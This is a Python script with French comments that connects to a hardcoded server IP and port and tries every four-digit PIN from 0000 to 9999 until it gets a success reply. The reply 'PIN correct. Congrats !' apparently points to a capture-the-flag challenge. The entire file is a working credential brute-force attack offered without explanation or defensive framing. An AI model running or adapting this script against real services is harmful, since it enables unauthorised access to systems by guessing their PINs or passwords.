import socket  # Import de la bibliothèque socket pour la communication réseau
import time    # Import de la bibliothèque time pour les délais

# Adresse IP et port du serveur
ip = "51.195.253.124"
port = 12345

# Générer une liste de PINs à tester, de 0000 à 9999
pins = [str(i).zfill(4) for i in range(10000)]

try:
    # Créer une connexion au serveur
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    for pin in pins:
        # Envoyer le PIN au serveur
        s.send(pin.encode('utf-8'))

        # Recevoir la réponse du serveur
        response = s.recv(1024).decode()

        # Afficher la réponse du serveur à des fins de débogage
        print(f"PIN : {pin}")
        print(f"Réponse du serveur : {response}")

        # Vérifier si le PIN est correct
        if "PIN correct. Congrats !" in response:
            print(f"PIN correct trouvé : {pin}")
            break
        else:
            print(f"PIN incorrect : {pin}")

        # Ajouter un délai de 0.1 seconde entre chaque tentative
        time.sleep(0.1)

except Exception as e:
    print(f"Erreur : {e}")
finally:
    # Fermer la connexion lorsque nous avons terminé
    s.close()
